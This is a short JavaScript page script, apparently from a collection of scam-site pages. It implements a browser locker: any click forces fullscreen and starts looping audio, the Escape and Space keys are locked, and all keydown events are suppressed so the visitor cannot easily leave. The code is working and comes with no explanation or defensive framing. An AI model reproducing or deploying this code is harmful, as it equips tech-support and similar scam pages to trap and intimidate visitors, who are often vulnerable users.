function getQueryParam(param) {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(param);
}
$(document).ready(function(){

    var audioElement = document.createElement('audio');
    audioElement.setAttribute('src', 'https://github.com/kaepi2022/Scam-Site-collection/raw/main/%E5%AE%9D%E7%AE%B1%E3%81%AE%E3%82%B8%E3%82%A7%E3%83%83%E3%83%88%E3%82%B3%E3%83%BC%E3%82%B9%E3%82%BF%E3%83%BC.mp3');
    
    audioElement.addEventListener('ended', function() {
        this.play();
    }, false);
    addEventListener("click", function() {
        var el = document.documentElement
            , reffer =
                   el.requestFullScreen
                || el.webkitRequestFullScreen
                || el.mozRequestFullScreen
        ;
        reffer.call(el);
        audioElement.play();
    });

   if ('keyboard' in navigator && 'lock' in navigator.keyboard) {
        // Request to lock the keyboard
        navigator.keyboard.lock(['Escape', 'Space']); // Locks the 'Escape' and 'Space' keys
      } else {
        console.log('Keyboard Lock API is not supported in this browser.');
      }
    document.addEventListener('keydown', function(event) {
        event.preventDefault();
    }, false);
   
});